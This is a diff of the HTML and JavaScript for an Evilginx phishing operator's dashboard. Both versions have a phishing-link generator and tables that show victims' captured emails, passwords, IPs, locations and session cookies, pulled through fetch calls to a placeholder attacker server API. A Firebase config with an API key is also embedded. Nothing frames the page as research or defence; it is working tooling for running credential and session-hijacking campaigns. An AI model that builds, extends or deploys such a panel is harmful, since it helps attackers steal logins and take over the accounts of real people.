@@ -3,97 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Panel</title>
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <title>Dashboard</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
         }
-        .hidden { display: none; }
+        .container {
+            display: flex;
+            height: 100vh;
+        }
+        .sidebar {
+            width: 250px;
+            background: #333;
+            color: white;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        .sidebar a {
+            color: white;
+            padding: 10px;
+            text-decoration: none;
+            display: block;
+        }
+        .sidebar a:hover {
+            background: #444;
+        }
+        .content {
+            flex: 1;
+            padding: 20px;
+        }
     </style>
 </head>
-<body class="h-screen flex">
-    <aside class="w-64 bg-gray-900 p-6">
-        <h2 class="text-xl font-bold mb-6">Dashboard</h2>
-        <nav>
-            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="generate-link">Generate Link</button>
-            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="captured-sessions">Captured Sessions</button>
-            <button class="menu-btn block w-full p-3 bg-gray-700 rounded mb-2" data-section="cookies">Cookies</button>
-            <button onclick="logout()" class="block w-full p-3 bg-red-600 rounded">Logout</button>
-        </nav>
-    </aside>
+<body>
 
-    <main class="flex-grow p-6">
-        <section id="generate-link" class="hidden">
-            <h2 class="text-2xl mb-4">Generate Phishing Link</h2>
-            <button onclick="generateLink()" class="bg-green-500 text-white px-4 py-2 rounded">Generate Link</button>
-            <p id="generated-link" class="mt-4"></p>
-        </section>
+<div class="container">
+    <div class="sidebar">
+        <h2>Dashboard</h2>
+        <a href="#" onclick="generateLink()">Generate Link</a>
+        <a href="#" onclick="loadCapturedSessions()">Captured Sessions</a>
+        <a href="#" onclick="loadCookies()">Cookies</a>
+        <a href="#" onclick="logout()">Logout</a>
+    </div>
+    <div class="content">
+        <h2>Welcome to the Dashboard</h2>
+        <div id="data-section"></div>
+    </div>
+</div>
 
-        <section id="captured-sessions" class="hidden">
-            <h2 class="text-2xl mb-4">Captured Sessions</h2>
-            <table class="w-full bg-white text-black rounded">
-                <thead><tr><th>Email</th><th>Password</th><th>IP</th><th>Location</th><th>Timestamp</th></tr></thead>
-                <tbody id="session-data"></tbody>
-            </table>
-        </section>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
+        authDomain: "panel-auth-134b7.firebaseapp.com",
+        projectId: "panel-auth-134b7",
+        storageBucket: "panel-auth-134b7.firebasestorage.app",
+        messagingSenderId: "892746068340",
+        appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
+    };
 
-        <section id="cookies" class="hidden">
-            <h2 class="text-2xl mb-4">Captured Cookies</h2>
-            <table class="w-full bg-white text-black rounded">
-                <thead><tr><th>Session ID</th><th>Cookie Data</th></tr></thead>
-                <tbody id="cookies-data"></tbody>
-            </table>
-        </section>
-    </main>
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
 
-    <script>
-        firebase.initializeApp({
-            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
-            authDomain: "panel-auth-134b7.firebaseapp.com",
-            projectId: "panel-auth-134b7",
-            storageBucket: "panel-auth-134b7.firebasestorage.app",
-            messagingSenderId: "892746068340",
-            appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
-        });
-
-        const auth = firebase.auth();
+    function checkAuth() {
         auth.onAuthStateChanged(user => {
-            if (!user) window.location.href = 'index.html';
-        });
-
-        function logout() {
-            auth.signOut().then(() => window.location.href = 'index.html');
-        }
-
-        document.querySelectorAll('.menu-btn').forEach(button => {
-            button.addEventListener('click', () => {
-                document.querySelectorAll('section').forEach(section => section.classList.add('hidden'));
-                document.getElementById(button.dataset.section).classList.remove('hidden');
-            });
-        });
-
-        async function generateLink() {
-            try {
-                let response = await fetch('https://your-evilginx-server/api/generate', { method: 'POST' });
-                let data = await response.json();
-                document.getElementById('generated-link').innerText = data.link;
-            } catch (error) {
-                console.error('Error generating link:', error);
+            if (!user) {
+                window.location.href = "index.html";
             }
-        }
+        });
+    }
 
-        async function loadCapturedSessions() {
-            let response = await fetch('https://your-evilginx-server/api/sessions');
-            let sessions = await response.json();
-            document.getElementById('session-data').innerHTML = sessions.map(s => `<tr><td>${s.email}</td><td>${s.password}</td><td>${s.ip}</td><td>${s.location}</td><td>${s.timestamp}</td></tr>`).join('');
-        }
+    checkAuth();
 
-        document.querySelector('[data-section="captured-sessions"]').addEventListener('click', loadCapturedSessions);
-    </script>
+    function logout() {
+        auth.signOut().then(() => {
+            window.location.href = "index.html";
+        });
+    }
+
+    async function generateLink() {
+        const response = await fetch('http://YOUR_EVILGINX_SERVER/api/generate-link', {
+            method: 'POST'
+        });
+        const data = await response.json();
+        document.getElementById('data-section').innerHTML = `<p>Generated Link: ${data.link}</p>`;
+    }
+
+    async function loadCapturedSessions() {
+        const response = await fetch('http://YOUR_EVILGINX_SERVER/api/captured-sessions');
+        const data = await response.json();
+        let table = `<table border="1"><tr><th>Email</th><th>Password</th><th>IP</th><th>Location</th><th>Cookies</th></tr>`;
+        data.sessions.forEach(session => {
+            table += `<tr><td>${session.email}</td><td>${session.password}</td><td>${session.ip}</td><td>${session.location}</td><td>${session.cookies}</td></tr>`;
+        });
+        table += `</table>`;
+        document.getElementById('data-section').innerHTML = table;
+    }
+
+    async function loadCookies() {
+        const response = await fetch('http://YOUR_EVILGINX_SERVER/api/cookies');
+        const data = await response.json();
+        let table = `<table border="1"><tr><th>Cookie Name</th><th>Value</th></tr>`;
+        data.cookies.forEach(cookie => {
+            table += `<tr><td>${cookie.name}</td><td>${cookie.value}</td></tr>`;
+        });
+        table += `</table>`;
+        document.getElementById('data-section').innerHTML = table;
+    }
+</script>
+
 </body>
 </html>
